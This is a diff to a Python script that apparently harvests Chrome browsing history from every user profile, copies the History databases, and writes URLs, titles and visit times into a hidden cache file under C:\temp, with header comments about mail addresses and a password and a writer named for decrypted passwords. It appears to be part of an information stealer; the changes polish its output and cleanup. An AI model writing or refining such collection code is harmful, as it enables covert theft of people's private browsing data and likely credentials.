@@ -6,6 +6,7 @@ import csv
 import os
 import sqlite3
 import shutil
+from datetime import datetime, timedelta
 # import browserhistory as bh
 
 # The mail addresses and password
@@ -21,6 +22,12 @@ def get_chrome_history():
     except Exception:  # NOQA
         pass
 
+    try:
+        if os.path.exists("C:\\temp\\.tempcache.csv"):
+            os.remove("C:\\temp\\.tempcache.csv")
+    except Exception:  # NOQA
+        pass
+
     # base path for Chrome's User Data directory
     base_path = os.path.join(os.getenv("APPDATA"), "..\\Local\\Google\\Chrome\\User Data")
 
@@ -29,7 +36,6 @@ def get_chrome_history():
 
     for profile in profiles:
         history_path = os.path.join(base_path, profile, 'History')
-        print(history_path)
         if os.path.exists(history_path):
             temp_history_path = os.path.join("C:\\temp", f'{profile}_History')
             shutil.copyfile(history_path, temp_history_path)
@@ -37,12 +43,16 @@ def get_chrome_history():
             # connect to the SQLite database
             conn = sqlite3.connect(temp_history_path)
             cursor = conn.cursor()
-            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
+            cursor.execute("SELECT url, title, last_visit_time FROM urls")
+
+            def chrome_time_to_datetime(chrome_time):
+                return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)
+            rows = [(url, title, chrome_time_to_datetime(int(last_visit_time))) for url, title, last_visit_time in cursor.fetchall()]
 
             # write to csv file but don't delete the previous data
             with open("C:\\temp\\.tempcache.csv", mode='a', newline='', encoding='utf-8') as decrypt_password_file:
                 decrypt_password_writer = csv.writer(decrypt_password_file, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
-                decrypt_password_writer.writerows(cursor.fetchall())
+                decrypt_password_writer.writerows(rows)
 
             # close the database connection
             conn.close()
